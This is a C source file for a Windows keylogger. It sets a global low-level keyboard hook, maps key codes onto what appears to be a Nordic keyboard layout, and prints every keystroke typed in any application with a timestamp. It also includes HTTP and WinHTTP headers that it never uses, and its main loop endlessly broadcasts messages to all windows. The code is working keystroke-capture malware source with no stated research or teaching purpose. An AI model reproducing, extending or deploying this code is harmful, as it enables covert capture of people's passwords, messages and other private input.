#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <http.h>
#include <winhttp.h>
#include <httprequest.h>
#include <stdint.h>

#define LOWERCASE_OFFSET 32

typedef struct {
    int c;
    char timestamp[9];
} keystroke_s;


void setTimestamp(keystroke_s* ks) {
    SYSTEMTIME time;
    GetSystemTime(&time);
    sprintf(ks->timestamp, "%02d:%02d:%02d", time.wHour, time.wMinute, time.wSecond);
}

bool CAPSLOCK() {
    return GetKeyState(VK_CAPITAL);
}

bool SHIFT() {
    return GetAsyncKeyState(VK_SHIFT);
}

bool ALT() {
    return GetAsyncKeyState(VK_MENU);
}

bool CTRL() {
    return GetAsyncKeyState(VK_CONTROL);
}

bool CTRL_ALT() {
    return CTRL() && ALT();
}

int numKeySymbol(char symbols[3]) {
    if(SHIFT()) return symbols[1];
    if(CTRL_ALT()) return symbols[2];
    return symbols[0];
}

int misc2KeySymbol(char symbols[2]) {
    if(SHIFT()) return symbols[1];
    return symbols[0];
}

int misc3KeySymbol(char symbols[3]) {
    if(SHIFT()) return symbols[1];
    if(CTRL_ALT()) return symbols[2];
    return symbols[0];
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    static char numKeySymbols[10][3] = {
        {'0', '=', '}'},
        {'1', '!', 0},
        {'2', '\"', '@'},
        {'3', '#', '\x9C'}, // £
        {'4', '\xCF', '$'}, // ¤
        {'5', '%', '\xD5'}, // €
        {'6', '&', 0},
        {'7', '/', '{'},
        {'8', '(', '['},
        {'9', ')', ']'}
    };

    static char misc2KeySymbols[6][2] = {
        {'+', '?'},
        {',', ';'},
        {'-', '_'},
        {'.', ':'},
        {'\'', '*'},
        {'\xAB', '\xF5'} // ½, §
    };

    static char misc3KeySymbols[4][3] = {
        {'<', '>', '\\'},
        {'\xEF', '`', '|'}, // ´
        {'\xF9', '^', '~'}  // ¨
    };

    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT* KBDLL_ptr = (KBDLLHOOKSTRUCT*)lParam;
        keystroke_s ks;
        setTimestamp(&ks);

        switch (KBDLL_ptr->vkCode) {
            case '0' ... '9': {
                if(CTRL() && !ALT()) break;
                ks.c = numKeySymbol(numKeySymbols[KBDLL_ptr->vkCode - '0']);
                if (ks.c != 0) printf("%s: %c\n", ks.timestamp, ks.c);
            } break;
            case 'A' ... 'Z': {
                if(CTRL()) break;
                ks.c = (int)KBDLL_ptr->vkCode + (SHIFT() || CAPSLOCK() ? 0 : LOWERCASE_OFFSET);
                printf("%s: %c\n", ks.timestamp, ks.c);
            } break;

            case VK_OEM_PLUS:
            case VK_OEM_COMMA:
            case VK_OEM_MINUS:
            case VK_OEM_PERIOD:
            case VK_OEM_2:
            case VK_OEM_5: {
                if(CTRL() || ALT()) break;
                if(KBDLL_ptr->vkCode == VK_OEM_5) ks.c = misc2KeySymbol(misc2KeySymbols[5]);
                else ks.c = misc2KeySymbol(misc2KeySymbols[KBDLL_ptr->vkCode - VK_OEM_PLUS]);
                printf("%s: %c\n", ks.timestamp, ks.c);
            } break;

            case VK_OEM_1:
            case VK_OEM_4:
            case VK_OEM_102: {
                if((CTRL() && !ALT()) || (ALT() && !SHIFT() && !CTRL())) break;
                switch(KBDLL_ptr->vkCode) {
                    case VK_OEM_102: ks.c = misc3KeySymbol(misc3KeySymbols[0]); break;
                    case VK_OEM_4:   ks.c = misc3KeySymbol(misc3KeySymbols[1]); break;
                    case VK_OEM_1:   ks.c = misc3KeySymbol(misc3KeySymbols[2]); break;
                    default: __builtin_unreachable();
                }
                printf("%s: %c\n", ks.timestamp, ks.c);
            } break;

            case VK_SPACE:
            case VK_RETURN:
            case VK_TAB:
            case VK_BACK:
            case VK_DELETE: {
                char msg[32] = {0};
                if(CTRL()) strcat(msg, "CTRL ");
                switch (KBDLL_ptr->vkCode) {
                    case VK_SPACE:  strcat(msg, "SPACE"); break;
                    case VK_RETURN: strcat(msg, "ENTER"); break;
                    case VK_TAB:    strcat(msg, "TAB"); break;
                    case VK_BACK:   strcat(msg, "BACKSPACE"); break;
                    case VK_DELETE: strcat(msg, "DELETE"); break;
                    default: __builtin_unreachable();
                }
                printf("%s: [%s]\n", ks.timestamp, msg);
            } break;

            default: break;
        }

    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}


int main(void) {
    const int allThreads = 0;
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, allThreads);
    if (hook == NULL) exit(EXIT_FAILURE);
    while (true) {
        SendMessageA(HWND_BROADCAST, WM_CHAR, 0, 0);
    }
    UnhookWindowsHookEx(hook); // unreachable anyway

    return 0;
}